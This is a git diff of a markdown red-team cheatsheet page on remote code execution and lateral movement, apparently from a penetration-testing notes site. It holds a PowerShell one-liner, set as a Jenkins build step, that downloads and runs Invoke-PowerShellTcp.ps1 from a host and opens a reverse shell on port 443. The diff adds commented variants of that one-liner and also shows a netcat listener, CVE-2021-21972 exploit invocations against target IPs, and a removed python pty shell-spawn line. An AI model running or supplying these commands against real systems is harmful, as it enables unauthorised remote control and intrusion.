@@ -1,10 +1,10 @@
 ---
 layout: post
-title: move / rce 2
+title: move / rce / tested
 category: 05-move
 parent: cheatsheets
 modified_date: 2024-11-28
-permalink: /move/rce2
+permalink: /move/rce
 ---
 
 **Mitre Att&ck Entreprise**: 
@@ -25,7 +25,6 @@ permalink: /move/rce2
 	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter)
 	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter-1)
 	* [CVE-2021-21972-VCenter](#CVE-2021-21972-VCenter)
-* [rshell](#rshell)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -107,6 +106,10 @@ podman pull --creds "USER:PASS" registry.azurecr.io/<image_name>:<tag>
 # 02 # jenkins # select a project
 # 03 # jenkins # add a build step as "windows batch command" 
 powershell.exe iex (iwr http://172.16.100.83/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.83 -Port 443
+# TEST#
+#powershell.exe iex ($zc2srv_ip="");
+#powershell.exe iex (iwr http://${zc2srv_ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress $zc2srv_ip -Port 443
+#powershell.exe iex ("iwr http://"+$zc2srv_ip+"/Invoke-PowerShellTcp.ps1 -UseBasicParsing");Power -Reverse -IPAddress $zc2srv_ip -Port 443
 # 04 # box # offer the download of "invoke-powershelltcp" with HFS.exe
 # 05 # box # listen connecting reverse shells with "nc64.exe"
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
@@ -203,11 +206,4 @@ cd ../CVE-2021-21972/
 sudo python3 CVE-2021-21972.py -t 1.2.3.3
 python3 CVE-2021-21972.py -t 1.2.3.3
 python3 CVE-2021-21972.py -t 1.2.3.4
-```
-
-## <a name='rshell'></a>rshell
-[database](https://shell-storm.org/shellcode/index.html)
-```sh
-# run bash via python
-python -c 'import pty; pty.spawn("/bin/bash")'
 ```
